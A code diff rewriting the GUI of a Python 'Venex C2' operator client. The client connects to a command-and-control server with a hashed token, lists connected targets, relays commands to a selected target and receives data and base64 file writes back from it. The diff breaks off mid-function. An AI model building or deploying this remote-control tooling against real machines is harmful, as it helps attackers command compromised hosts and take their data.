+        ctk.CTkLabel(conn_card, text="Port:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(15, 5))
+        self.port_entry = ctk.CTkEntry(conn_card, textvariable=self.server_port, width=80, border_width=0, fg_color="#3d3d3d")
+        self.port_entry.pack(side="left", padx=5, pady=15)
 
-        # Command row content
-        ttk.Label(cmd_frame, text="Command:").grid(row=0, column=0, sticky=tk.W)
-        self.command_entry = ttk.Entry(cmd_frame, width=50)
-        self.command_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=5)
-        self.command_entry.bind("<Return>", self.send_command)
+        self.connect_btn = ctk.CTkButton(conn_card, text="Connect", command=self.toggle_connection, 
+                                        fg_color=ACCENT_BLUE, hover_color=ACCENT_HOVER, corner_radius=8, width=120, font=ctk.CTkFont(weight="bold"))
+        self.connect_btn.pack(side="right", padx=20, pady=15)
 
-        ttk.Button(cmd_frame, text="Send", command=self.send_command).grid(row=0, column=2, padx=5)
+        # Views Container
+        self.views = {}
+        self.setup_dashboard_view()
+        self.setup_content_view()
+        self.setup_settings_view()
+        
+        self.show_dashboard()
 
-        # Configure column weights for each sub-frame
-        mode_frame.columnconfigure(0, weight=1)
-        mode_frame.columnconfigure(1, weight=0)
+        # --- Bottom Command Bar ---
+        self.cmd_bar = ctk.CTkFrame(self, height=120, fg_color="#1a1a1a", corner_radius=0)
+        self.cmd_bar.grid(row=1, column=1, sticky="ew")
+        self.cmd_bar.grid_columnconfigure(0, weight=1)
 
-        cmd_frame.columnconfigure(0, weight=0)
-        cmd_frame.columnconfigure(1, weight=1)
-        cmd_frame.columnconfigure(2, weight=0)
+        self.mode_label = ctk.CTkLabel(self.cmd_bar, text="MODE: C2 SERVER", font=ctk.CTkFont(size=11, weight="bold"), text_color=TEXT_SECONDARY)
+        self.mode_label.grid(row=0, column=0, padx=30, pady=(15, 0), sticky="w")
 
-        # Configure main command frame
-        command_frame.columnconfigure(0, weight=1)
-        
-        # Configure main window grid weights
-        self.root.columnconfigure(0, weight=1)
-        self.root.rowconfigure(1, weight=1)
+        cmd_input_container = ctk.CTkFrame(self.cmd_bar, fg_color="transparent")
+        cmd_input_container.grid(row=1, column=0, sticky="ew", padx=30, pady=(5, 20))
+        cmd_input_container.grid_columnconfigure(0, weight=1)
 
-    def setup_main_tab(self, parent):
-        # Main container with left and right panes
-        main_paned = ttk.PanedWindow(parent, orient=tk.HORIZONTAL)
-        main_paned.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
-        
-        # Left frame (Targets and Connection info) - larger
-        left_frame = ttk.Frame(main_paned)
-        main_paned.add(left_frame, weight=1)  # Larger weight = more space
+        self.cmd_entry = ctk.CTkEntry(cmd_input_container, placeholder_text="Type a command (e.g., help, interact ID)...", 
+                                     height=45, corner_radius=10, border_width=1, border_color="#3d3d3d", fg_color="#252525")
+        self.cmd_entry.grid(row=0, column=0, sticky="ew", padx=(0, 15))
+        self.cmd_entry.bind("<Return>", self.send_command)
 
-        # Right frame (Data messages) - very small
-        right_frame = ttk.Frame(main_paned)
-        main_paned.add(right_frame, weight=1)  # Smaller weight = less space
+        self.send_btn = ctk.CTkButton(cmd_input_container, text="Execute", command=self.send_command, 
+                                     width=100, height=45, corner_radius=10, fg_color=ACCENT_BLUE)
+        self.send_btn.grid(row=0, column=1)
+
+        # === AUTOCOMPLETE SETUP ===
+        self.internal_entry = self.cmd_entry._entry
+        self.internal_entry.configure(
+            selectbackground="#252525",
+            selectforeground="#cccccc"    # bright ghost text
+        )
+
+        self.internal_entry.bind("<KeyRelease>", self.on_key_release)
+        self.internal_entry.bind("<BackSpace>", self.on_backspace)
+        self.internal_entry.bind("<Tab>", self.on_tab)
+        self.internal_entry.bind("<Right>", self.on_right_arrow)
+        self.internal_entry.bind("<Return>", lambda e: self.send_command())
+
+    def create_nav_button(self, text, icon, row, command):
+        btn = ctk.CTkButton(self.sidebar, text=f"  {icon}  {text}", anchor="w", height=45, 
+                           fg_color="transparent", hover_color="#2d2d2d", corner_radius=8,
+                           font=ctk.CTkFont(size=14), command=command)
+        btn.grid(row=row, column=0, padx=20, pady=5, sticky="ew")
+        return btn
+
+    def setup_dashboard_view(self):
+        view = ctk.CTkFrame(self.main_area, fg_color="transparent")
+        self.views["dashboard"] = view
+        view.grid_columnconfigure(0, weight=2)
+        view.grid_columnconfigure(1, weight=1)
+        view.grid_rowconfigure(0, weight=1)
+
+        # Left: Targets & Output
+        left_col = ctk.CTkFrame(view, fg_color="transparent")
+        left_col.grid(row=0, column=0, sticky="nsew", padx=(0, 20))
+        left_col.grid_columnconfigure(0, weight=1)
+        left_col.grid_rowconfigure(0, weight=1)
+        left_col.grid_rowconfigure(1, weight=1)
+
+        # Targets Card
+        target_card = ctk.CTkFrame(left_col, fg_color=CARD_DARK, corner_radius=15)
+        target_card.grid(row=0, column=0, sticky="nsew", pady=(0, 20))
+        target_card.grid_columnconfigure(0, weight=1)
+        target_card.grid_rowconfigure(1, weight=1)
         
-        # Targets frame (Left side)
-        targets_frame = ttk.LabelFrame(left_frame, text="Connected Targets", padding="10")
-        targets_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(0, 5), pady=5)
+        ctk.CTkLabel(target_card, text="Active Targets", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
         
-        # Treeview for targets
-        columns = ("target_id", "last_seen", "status")
-        self.targets_tree = ttk.Treeview(targets_frame, columns=columns, show="headings")
-        self.targets_tree.heading("target_id", text="Target ID")
-        self.targets_tree.heading("last_seen", text="Last Seen")
-        self.targets_tree.heading("status", text="Status")
+        # Custom Treeview Styling
+        style = ttk.Style()
+        style.theme_use("clam")
+        style.configure("Treeview", background=CARD_DARK, foreground=TEXT_PRIMARY, fieldbackground=CARD_DARK, borderwidth=0, rowheight=40)
+        style.map("Treeview", background=[('selected', ACCENT_BLUE)])
         
-        self.targets_tree.column("target_id", width=200)
-        self.targets_tree.column("last_seen", width=150)
-        self.targets_tree.column("status", width=100)
+        self.targets_tree = ttk.Treeview(target_card, columns=("id", "last", "status"), show="headings")
+        self.targets_tree.heading("id", text="TARGET ID")
+        self.targets_tree.heading("last", text="LAST SEEN")
+        self.targets_tree.heading("status", text="STATUS")
+        self.targets_tree.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))
         
-        # Scrollbar for treeview
-        tree_scroll = ttk.Scrollbar(targets_frame, orient=tk.VERTICAL, command=self.targets_tree.yview)
-        self.targets_tree.configure(yscrollcommand=tree_scroll.set)
-        
-        self.targets_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
-        tree_scroll.grid(row=0, column=1, sticky=(tk.N, tk.S))
-        
-        # Messages frame (Left side - for connection and target messages)
-        data_messages_frame = ttk.LabelFrame(left_frame, text="Data Messages", padding="10")
-        data_messages_frame.grid(row=1, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(0, 5), pady=5)
-        
-        self.data_messages_text = scrolledtext.ScrolledText(data_messages_frame, width=70, height=15, 
-                                                     bg=self.text_bg, fg=self.data_color,
-                                                     insertbackground=self.data_color)
-        self.data_messages_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
-        
-        # Data Messages frame (Right side - for DATA messages only)
-        messages_frame = ttk.LabelFrame(right_frame, text="Connection Messages", padding="10")
-        messages_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(5, 0), pady=5)
-        
-        self.messages_text = scrolledtext.ScrolledText(messages_frame, width=30, height=20, 
-                                                          bg=self.text_bg, fg=self.text_fg,
-                                                          insertbackground=self.fg_color)
-        self.messages_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
-        
-        # Right-click menu for targets
-        self.target_menu = tk.Menu(self.root, tearoff=0, bg=self.button_bg, fg=self.fg_color)
+        self.target_menu = tk.Menu(self, tearoff=0, bg=CARD_DARK, fg=TEXT_PRIMARY, borderwidth=0)
         self.target_menu.add_command(label="Interact", command=self.interact_with_target)
-        
-        # Bind right-click to treeview
         self.targets_tree.bind("<Button-3>", self.show_target_menu)
-        
-        # Configure grid weights
-        left_frame.columnconfigure(0, weight=1)
-        left_frame.rowconfigure(0, weight=1)
-        left_frame.rowconfigure(1, weight=1)
-        
-        right_frame.columnconfigure(0, weight=1)
-        right_frame.rowconfigure(0, weight=1)
-        
-        targets_frame.columnconfigure(0, weight=1)
-        targets_frame.rowconfigure(0, weight=1)
-        
-        data_messages_frame.columnconfigure(0, weight=1)
-        data_messages_frame.rowconfigure(0, weight=1)
-        
-        messages_frame.columnconfigure(0, weight=1)
-        messages_frame.rowconfigure(0, weight=1)
-        
-        parent.columnconfigure(0, weight=1)
-        parent.rowconfigure(0, weight=1)
 
-    def setup_content_tab(self, parent):
-        """Setup the Content Box file explorer tab"""
-        # Top frame for navigation and buttons
-        nav_frame = ttk.Frame(parent)
-        nav_frame.grid(row=0, column=0, sticky=(tk.W, tk.E), padx=10, pady=(10, 5))
+        # Output Card
+        output_card = ctk.CTkFrame(left_col, fg_color=CARD_DARK, corner_radius=15)
+        output_card.grid(row=1, column=0, sticky="nsew")
+        output_card.grid_columnconfigure(0, weight=1)
+        output_card.grid_rowconfigure(1, weight=1)
         
-        # Back button
-        self.back_btn = ttk.Button(nav_frame, text="← Back", command=self.navigate_back)
-        self.back_btn.grid(row=0, column=0, padx=(0, 5))
-        
-        # Up button
-        self.up_btn = ttk.Button(nav_frame, text="↑ Up", command=self.navigate_up)
-        self.up_btn.grid(row=0, column=1, padx=5)
-        
-        # Refresh button
-        self.refresh_btn = ttk.Button(nav_frame, text="↻ Refresh", command=self.refresh_file_explorer)
-        self.refresh_btn.grid(row=0, column=2, padx=5)
-        
-        # Path label
-        self.path_label = ttk.Label(nav_frame, text="")
-        self.path_label.grid(row=0, column=3, padx=10, sticky=tk.W)
-        
-        # Tool buttons frame
-        tool_frame = ttk.Frame(parent)
-        tool_frame.grid(row=1, column=0, sticky=(tk.W, tk.E), padx=10, pady=(0, 5))
-        
-        # Open button
-        self.open_btn = ttk.Button(tool_frame, text="Open", command=self.open_selected_file)
-        self.open_btn.grid(row=0, column=0, padx=(0, 5))
-        
-        # Delete button
-        self.delete_btn = ttk.Button(tool_frame, text="Delete", command=self.delete_selected_file)
-        self.delete_btn.grid(row=0, column=1, padx=5)
-        
-        # # Upload button
-        # self.upload_btn = ttk.Button(tool_frame, text="Upload", command=self.upload_file)
-        # self.upload_btn.grid(row=0, column=2, padx=5)
-        
-        # # Download button
-        # self.download_btn = ttk.Button(tool_frame, text="Download", command=self.download_selected_file)
-        # self.download_btn.grid(row=0, column=3, padx=5)
-        
-        # File explorer treeview
-        explorer_frame = ttk.Frame(parent)
-        explorer_frame.grid(row=2, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=10, pady=(0, 10))
-        
-        # Treeview for files
-        columns = ("name", "size", "type", "modified")
-        self.files_tree = ttk.Treeview(explorer_frame, columns=columns, show="headings", selectmode="browse")
-        
-        self.files_tree.heading("name", text="Name")
-        self.files_tree.heading("size", text="Size")
-        self.files_tree.heading("type", text="Type")
-        self.files_tree.heading("modified", text="Modified")
-        
-        self.files_tree.column("name", width=300)
-        self.files_tree.column("size", width=100)
-        self.files_tree.column("type", width=100)
-        self.files_tree.column("modified", width=150)
-        
-        # Scrollbars
-        vsb = ttk.Scrollbar(explorer_frame, orient="vertical", command=self.files_tree.yview)
-        hsb = ttk.Scrollbar(explorer_frame, orient="horizontal", command=self.files_tree.xview)
-        self.files_tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
-        
-        self.files_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
-        vsb.grid(row=0, column=1, sticky=(tk.N, tk.S))
-        hsb.grid(row=1, column=0, sticky=(tk.W, tk.E))
-        
-        # Status bar
-        self.status_label = ttk.Label(parent, text="Ready")
-        self.status_label.grid(row=3, column=0, sticky=(tk.W, tk.E), padx=10, pady=(0, 10))
-        
-        # Bind double-click to open files/folders
-        self.files_tree.bind("<Double-1>", self.on_double_click)
-        
-        # Configure grid weights
-        nav_frame.columnconfigure(3, weight=1)
-        tool_frame.columnconfigure(4, weight=1)
-        
-        explorer_frame.columnconfigure(0, weight=1)
-        explorer_frame.rowconfigure(0, weight=1)
-        
-        parent.columnconfigure(0, weight=1)
-        parent.rowconfigure(2, weight=1)
+        ctk.CTkLabel(output_card, text="Terminal Output", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
+        self.output_text = ctk.CTkTextbox(output_card, fg_color="#1a1a1a", text_color=SUCCESS_GREEN, font=("Consolas", 13), corner_radius=10)
+        self.output_text.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))
 
-    def refresh_file_explorer(self):
-        """Refresh the file explorer view"""
-        # Clear current items
-        for item in self.files_tree.get_children():
-            self.files_tree.delete(item)
+        # Right: Logs
+        log_card = ctk.CTkFrame(view, fg_color=CARD_DARK, corner_radius=15)
+        log_card.grid(row=0, column=1, sticky="nsew")
+        log_card.grid_columnconfigure(0, weight=1)
+        log_card.grid_rowconfigure(1, weight=1)
         
-        # Update path label
-        self.path_label.config(text=f"Path: {self.current_path}")
-        
-        try:
-            # Get directory contents
-            contents = os.listdir(self.current_path)
-            
-            # Separate directories and files
-            dirs = []
-            files = []
-            
-            for item in contents:
-                item_path = os.path.join(self.current_path, item)
-                if os.path.isdir(item_path):
-                    dirs.append((item, "Folder", os.path.getmtime(item_path)))
-                else:
-                    size = os.path.getsize(item_path)
-                    # Format size
-                    if size < 1024:
-                        size_str = f"{size} B"
-                    elif size < 1024 * 1024:
-                        size_str = f"{size/1024:.1f} KB"
-                    else:
-                        size_str = f"{size/(1024*1024):.1f} MB"
-                    
-                    # Get file extension
-                    ext = os.path.splitext(item)[1].lower()
-                    files.append((item, size_str, ext, os.path.getmtime(item_path)))
-            
-            # Sort directories alphabetically
-            dirs.sort(key=lambda x: x[0].lower())
-            
-            # Sort files alphabetically
-            files.sort(key=lambda x: x[0].lower())
-            
-            # Insert directories with folder icon
-            for name, file_type, mtime in dirs:
-                mtime_str = datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S")
-                self.files_tree.insert("", "end", values=(f"[{name}]", "", "Folder", mtime_str))
-            
-            # Insert files
-            for name, size, file_type, mtime in files:
-                mtime_str = datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S")
-                self.files_tree.insert("", "end", values=(name, size, file_type, mtime_str))
-            
-            self.status_label.config(text=f"Found {len(dirs)} folders and {len(files)} files")
-            
-        except Exception as e:
-            self.status_label.config(text=f"Error: {str(e)}")
+        ctk.CTkLabel(log_card, text="System Logs", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
+        self.log_text = ctk.CTkTextbox(log_card, fg_color="#1a1a1a", text_color=TEXT_SECONDARY, font=("Segoe UI", 11), corner_radius=10)
+        self.log_text.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))
 
-    def on_double_click(self, event):
-        """Handle double-click on file or folder"""
-        selection = self.files_tree.selection()
-        if not selection:
-            return
-            
-        item = self.files_tree.item(selection[0])
-        name = item['values'][0]
-        
-        # Remove brackets from folder names
-        if name.startswith('[') and name.endswith(']'):
-            name = name[1:-1]  # Remove brackets
-        
-        item_path = os.path.join(self.current_path, name)
-        
-        if os.path.isdir(item_path):
-            # Navigate into directory
-            self.current_path = item_path
-            self.refresh_file_explorer()
-        else:
-            # Open file
-            self.open_file(item_path)
 
-    def navigate_back(self):
-        """Go back to parent directory"""
-        if self.current_path != self.content_box_path:
-            self.current_path = os.path.dirname(self.current_path)
-            self.refresh_file_explorer()
 
-    def navigate_up(self):
-        """Go up one directory level"""
-        if self.current_path != self.content_box_path:
-            self.current_path = os.path.dirname(self.current_path)
-            self.refresh_file_explorer()
 
-    def open_selected_file(self):
-        """Open the selected file"""
-        selection = self.files_tree.selection()
-        if not selection:
-            messagebox.showwarning("No Selection", "Please select a file to open")
-            return
-            
-        item = self.files_tree.item(selection[0])
-        name = item['values'][0]
-        
-        # Remove brackets from folder names
-        if name.startswith('[') and name.endswith(']'):
-            name = name[1:-1]  # Remove brackets
-        
-        item_path = os.path.join(self.current_path, name)
-        
-        if os.path.isdir(item_path):
-            self.current_path = item_path
-            self.refresh_file_explorer()
-        else:
-            self.open_file(item_path)
+    def setup_content_view(self):
+        view = ctk.CTkFrame(self.main_area, fg_color="transparent")
+        self.views["content"] = view
+        view.grid_columnconfigure(0, weight=1)
+        view.grid_rowconfigure(1, weight=1)
 
-    def open_file(self, file_path):
-        """Open a file with the default application"""
-        try:
-            if platform.system() == 'Windows':
-                os.startfile(file_path)
-            elif platform.system() == 'Darwin':  # macOS
-                subprocess.run(['open', file_path])
-            else:  # Linux
-                subprocess.run(['xdg-open', file_path])
-            self.status_label.config(text=f"Opened: {os.path.basename(file_path)}")
-        except Exception as e:
-            messagebox.showerror("Error", f"Could not open file: {str(e)}")
+        # Explorer Card
+        explorer_card = ctk.CTkFrame(view, fg_color=CARD_DARK, corner_radius=15)
+        explorer_card.grid(row=0, column=0, rowspan=2, sticky="nsew")
+        explorer_card.grid_columnconfigure(0, weight=1)
+        explorer_card.grid_rowconfigure(1, weight=1)
 
-    def delete_selected_file(self):
-        """Delete the selected file or folder"""
-        selection = self.files_tree.selection()
-        if not selection:
-            messagebox.showwarning("No Selection", "Please select a file or folder to delete")
-            return
-            
-        item = self.files_tree.item(selection[0])
-        name = item['values'][0]
+        # Toolbar
+        toolbar = ctk.CTkFrame(explorer_card, fg_color="transparent")
+        toolbar.grid(row=0, column=0, sticky="ew", padx=20, pady=15)
         
-        # Remove brackets from folder names
-        if name.startswith('[') and name.endswith(']'):
-            name = name[1:-1]  # Remove brackets
+        self.path_entry = ctk.CTkEntry(toolbar, fg_color="#3d3d3d", border_width=0, height=35)
+        self.path_entry.pack(side="left", fill="x", expand=True, padx=(0, 10))
         
-        item_path = os.path.join(self.current_path, name)
-        
-        confirm = messagebox.askyesno("Confirm Delete", 
-                                     f"Are you sure you want to delete '{name}'?")
-        if not confirm:
-            return
-            
-        try:
-            if os.path.isdir(item_path):
-                # For directories, use shutil to delete recursively
-                import shutil
-                shutil.rmtree(item_path)
-            else:
-                os.remove(item_path)
-            self.status_label.config(text=f"Deleted: {name}")
-            self.refresh_file_explorer()
-        except Exception as e:
-            messagebox.showerror("Error", f"Could not delete: {str(e)}")
+        ctk.CTkButton(toolbar, text="Refresh", width=80, height=35, command=self.refresh_file_explorer).pack(side="left", padx=5)
+        ctk.CTkButton(toolbar, text="Up", width=60, height=35, command=self.go_up_directory).pack(side="left", padx=5)
+        ctk.CTkButton(toolbar, text="Delete", width=80, height=35, fg_color=DANGER_RED, hover_color="#a4262c", command=self.delete_selected_file).pack(side="left", padx=5)
 
-    # def upload_file(self):
-    #     """Upload a file from local system to content box"""
-    #     file_path = filedialog.askopenfilename(title="Select file to upload")
-    #     if not file_path:
-    #         return
-            
-    #     try:
-    #         # Get destination path
-    #         dest_path = os.path.join(self.current_path, os.path.basename(file_path))
-            
-    #         # Copy file
-    #         with open(file_path, 'rb') as src, open(dest_path, 'wb') as dst:
-    #             dst.write(src.read())
-            
-    #         self.status_label.config(text=f"Uploaded: {os.path.basename(file_path)}")
-    #         self.refresh_file_explorer()
-    #     except Exception as e:
-    #         messagebox.showerror("Error", f"Could not upload file: {str(e)}")
+        # Files Tree
+        self.files_tree = ttk.Treeview(explorer_card, columns=("name", "size", "type", "mod"), show="headings")
+        self.files_tree.heading("name", text="NAME")
+        self.files_tree.heading("size", text="SIZE")
+        self.files_tree.heading("type", text="TYPE")
+        self.files_tree.heading("mod", text="MODIFIED")
+        self.files_tree.grid(row=1, column=0, sticky="nsew", padx=20, pady=(0, 20))
+        self.files_tree.bind("<Double-1>", self.on_file_double_click)
 
-    # def download_selected_file(self):
-    #     """Download the selected file to local system"""
-    #     selection = self.files_tree.selection()
-    #     if not selection:
-    #         messagebox.showwarning("No Selection", "Please select a file to download")
-    #         return
-            
-    #     item = self.files_tree.item(selection[0])
-    #     name = item['values'][0]
+    def setup_settings_view(self):
+        view = ctk.CTkFrame(self.main_area, fg_color=CARD_DARK, corner_radius=15)
+        self.views["settings"] = view
         
-    #     # Remove brackets from folder names
-    #     if name.startswith('[') and name.endswith(']'):
-    #         messagebox.showwarning("Cannot Download", "Please select a file, not a folder")
-    #         return
+        ctk.CTkLabel(view, text="Settings", font=ctk.CTkFont(size=24, weight="bold")).pack(padx=40, pady=(40, 20), anchor="w")
         
-    #     item_path = os.path.join(self.current_path, name)
+        # Appearance
+        ctk.CTkLabel(view, text="Appearance Mode", font=ctk.CTkFont(weight="bold")).pack(padx=40, pady=(20, 5), anchor="w")
+        self.theme_opt = ctk.CTkOptionMenu(view, values=["Dark", "Light", "System"], command=lambda m: ctk.set_appearance_mode(m))
+        self.theme_opt.pack(padx=40, pady=10, anchor="w")
         
-    #     if os.path.isdir(item_path):
-    #         messagebox.showwarning("Cannot Download", "Please select a file, not a folder")
-    #         return
-            
-    #     dest_path = filedialog.asksaveasfilename(
-    #         title="Save file as",
-    #         initialfile=name,
-    #         defaultextension=os.path.splitext(name)[1]
-    #     )
-        
-    #     if not dest_path:
-    #         return
-            
-    #     try:
-    #         with open(item_path, 'rb') as src, open(dest_path, 'wb') as dst:
-    #             dst.write(src.read())
-    #         self.status_label.config(text=f"Downloaded: {name}")
-    #     except Exception as e:
-    #         messagebox.showerror("Error", f"Could not download file: {str(e)}")
+        # Token
+        ctk.CTkLabel(view, text="Authentication Token", font=ctk.CTkFont(weight="bold")).pack(padx=40, pady=(20, 5), anchor="w")
+        self.token_entry_set = ctk.CTkEntry(view, textvariable=self.auth_token, width=300, show="*")
+        self.token_entry_set.pack(padx=40, pady=10, anchor="w")
 
-    def process_gui_updates(self):
-        """Process all pending GUI updates from the queue"""
-        try:
-            while True:
-                # Get all pending updates (non-blocking)
-                callback, args = self.gui_queue.get_nowait()
-                callback(*args)
-        except:
-            pass  # Queue is empty
+    def show_dashboard(self): self.switch_view("dashboard", self.btn_dashboard)
+    def show_content(self): self.switch_view("content", self.btn_content)
+    def show_settings(self): self.switch_view("settings", self.btn_settings)
+
+    def switch_view(self, name, btn):
+        for v in self.views.values(): v.grid_forget()
+        self.views[name].grid(row=1, column=0, sticky="nsew")
         
-        # Schedule next check
-        self.root.after(100, self.process_gui_updates)
+        for b in [self.btn_dashboard, self.btn_content, self.btn_settings]:
+            b.configure(fg_color="transparent", text_color=TEXT_PRIMARY)
+        btn.configure(fg_color=ACCENT_BLUE, text_color="white")
 
-    def show_target_menu(self, event):
-        """Show context menu on right-click"""
-        item = self.targets_tree.identify_row(event.y)
-        if item:
-            self.targets_tree.selection_set(item)
-            self.target_menu.post(event.x_root, event.y_root)
-
-    def interact_with_target(self):
-        """Set interaction with selected target"""
-        selected = self.targets_tree.selection()
-        if selected:
-            target_id = self.targets_tree.item(selected[0], "values")[0]
-            self.interacting_with_target = target_id
-            self.interaction_status.config(text=f"Mode: Interacting with {target_id}")
-            self.normal_mode_btn.config(state=tk.NORMAL)
-            self.log_message(f"Now interacting with target: {target_id}")
-
-    def switch_to_normal_mode(self):
-        """Switch back to normal command mode"""
-        self.interacting_with_target = None
-        self.interaction_status.config(text="Mode: C2")
-        self.normal_mode_btn.config(state=tk.DISABLED)
-        self.log_message("Switched back to normal mode")
+    # --- Core Logic (Restored from Original) ---
 
     def toggle_connection(self):
-        if not self.connected:
-            self.connect_to_server()
-        else:
-            self.disconnect_from_server()
-    
-    def is_ip(self, addr):
-        """Check if the input is a valid IPv4 or IPv6 address"""
-        try:
-            ipaddress.ip_address(addr)
-            return True
-        except ValueError:
-            return False
+        if not self.connected: self.connect_to_server()
+        else: self.disconnect_from_server()
 
-    def resolve_host(self, host):
-        """Resolve a domain name to an IP address"""
+
+    def read_config(self, key):
         try:
-            return socket.gethostbyname(host)
-        except socket.gaierror:
-            return None
+            with open(self.config_file, "r") as f:
+                lines = f.readlines()
+                for line in lines:
+                    if line.startswith(f"{key}="):
+                        return line.split("=", 1)[1].strip()
+        except FileNotFoundError:
+            return ""
+        
+        return ""
+    
+    def save_config(self, key, value):
+        lines = []
+        found = False
+        try:
+            with open(self.config_file, "r") as f:
+                lines = f.readlines()
+            for i, line in enumerate(lines):
+                if line.startswith(f"{key}="):
+                    lines[i] = f"{key}={value}\n"
+                    found = True
+                    break
+            if not found:
+                lines.append(f"{key}={value}\n")
+            with open(self.config_file, "w") as f:
+                f.writelines(lines)
+        except FileNotFoundError:
+            with open(self.config_file, "w") as f:
+                f.write(f"{key}={value}\n")
+
+    def init_config(self):
+        if not os.path.exists(self.config_dir):
+            os.makedirs(self.config_dir)
+        if not os.path.exists(self.config_file):
+            with open(self.config_file, "w") as f:
+                f.write("# Venex C2 Client Configuration\n")
+            return
+        # if config file exists, fill variables
+        self.server_ip.set(self.read_config("server_ip"))
+        self.server_port.set(int(self.read_config("server_port")))
 
     def connect_to_server(self):
-        host_input = self.server_ip.get()
-
-        # Determine IP
-        if self.is_ip(host_input):
-            ip = host_input
-        else:
-            ip = self.resolve_host(host_input)
-            if ip is None:
-                messagebox.showerror("Error", f"Cannot resolve domain: {host_input}")
-            
+        host = self.server_ip.get()
         try:
+            ip = host if self.is_ip(host) else socket.gethostbyname(host)
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.socket.connect((self.server_ip.get(), self.server_port.get()))
+            self.socket.connect((ip, self.server_port.get()))
             self.connected = True
-            self.connect_btn.config(text="Disconnect")
             
-            # Start receive thread
-            self.receive_thread = threading.Thread(target=self.receive_messages, daemon=True)
-            self.receive_thread.start()
+            # Auth
+            if not self.auth_token.get():
+                token = self.read_config("auth_token")
+                if token == "":
+                    self.log_message("Error", "Authentication token not set. Please set it in Settings.")
+                    self.socket.close()
+                    self.connected = False
+                    return
+                self.sha256_token = token
+            else:
+                self.sha256_token = hashlib.sha256(self.auth_token.get().encode('utf-8')).hexdigest()
+
+            self.socket.sendall(f"TOKEN:{self.sha256_token}".encode("utf-8"))
+
+            self.connect_btn.configure(text="Disconnect", fg_color=DANGER_RED)
+            self.status_indicator.configure(text="● Connected", text_color=SUCCESS_GREEN)
             
-            self.log_message("Connected to server")
-            
+            threading.Thread(target=self.receive_messages, daemon=True).start()
+            self.log_message(f"Connected to {ip}")
         except Exception as e:
-            messagebox.showerror("Connection Error", f"Failed to connect: {str(e)}")
+            messagebox.showerror("Error", f"Connection failed: {e}")
 
     def disconnect_from_server(self):
         self.connected = False
-        if self.socket:
-            self.socket.close()
-            self.socket = None
-        
-        self.connect_btn.config(text="Connect")
-        self.log_message("Disconnected from server")
-        
-        # Clear targets
+        if self.socket: self.socket.close()
+        self.connect_btn.configure(text="Connect", fg_color=ACCENT_BLUE)
+        self.status_indicator.configure(text="● Disconnected", text_color=DANGER_RED)
+        self.log_message("Disconnected")
+        self.switch_to_normal_mode()
         with self.target_lock:
             self.targets.clear()
-            # Queue the treeview clearing operation
             self.gui_queue.put((self._clear_targets_tree, ()))
-        
-        # Reset interaction state
-        self.switch_to_normal_mode()
 
     def send_command(self, event=None):
-        if not self.connected:
-            messagebox.showwarning("Not Connected", "Not connected to server")
-            return
-            
-        command = self.command_entry.get()
-        if not command:
-            return
-            
+        cmd = self.cmd_entry.get()
+        if not cmd or not self.connected: return
         try:
-            # Format command based on interaction mode
-            if self.interacting_with_target:
-                formatted_command = f"TARGET:{self.interacting_with_target}:{command}"
-            else:
-                formatted_command = command
-                
-            self.socket.sendall((formatted_command + "\n").encode())
-            self.command_entry.delete(0, tk.END)
-            self.log_message(f"Sent: {formatted_command}")
-        except Exception as e:
-            self.log_message(f"Error sending command: {str(e)}")
+            f_cmd = f"TARGET:{self.interacting_with_target}:{cmd}" if self.interacting_with_target else cmd
+            self.socket.sendall((f_cmd + "\n").encode())
+            self.cmd_entry.delete(0, tk.END)
+            self.log_message(f"Sent: {f_cmd}")
+        except Exception as e: self.log_message(f"Error: {e}")
 
     def receive_messages(self):
         buffer = b""
         while self.connected:
             try:
                 data = self.socket.recv(4096)
-                if not data:
-                    break  # connection closed
-
+                if not data: break
                 buffer += data
-
-                # process complete messages only
                 while b"END_OF" in buffer:
                     line, buffer = buffer.split(b"END_OF", 1)
-                    line = line.strip()
-                    
-                    if line:
-                        self.process_message(line)
-
-            except Exception as e:
-                if self.connected:
-                    self.log_message(f"Error receiving data: {str(e)}")
-                break
-
-        if self.connected:
-            self.gui_queue.put((self.disconnect_from_server, ()))
+                    if line.strip(): self.process_message(line.strip())
+            except: break
+        self.gui_queue.put((self.disconnect_from_server, ()))
 
     def process_message(self, message):
-        # print(message)
-        # Check if this is a target registration message
         if message.startswith(b"TARGET:"):
-            # Extract target ID from previous command
-            target_id = message[7:].strip().decode('utf-8')
-            self.add_target(target_id)
-        
+            self.add_target(message[7:].strip().decode('utf-8'))
         elif message.startswith(b"/DATA:"):
-            message = message[5:].decode('utf-8')  # remove "DATA:"
-            lines = message.split("\n")  # split into all lines
-            self.gui_queue.put((self.log_data_message, (f"",)))
-            for line in lines:
-                if line.strip():  # optional: skip empty lines
-                    clean_line = re.sub(r'\s+$', '', line)
-                    self.gui_queue.put((self.log_data_message, (f" $$-> {clean_line}",)))
-
+            text = message[6:].decode('utf-8')
+            self.gui_queue.put((self.log_data_message, (f"$$-> {text}",)))
         elif message.startswith(b"/WRITE:"):
+             # Remove the command prefix
+            payload = message[len(b"/WRITE:"):]
 
-            try:
-                # Split only first two ":" so base64 remains untouched
-                _, filename, ext, b64data = message.split(b":", 3)
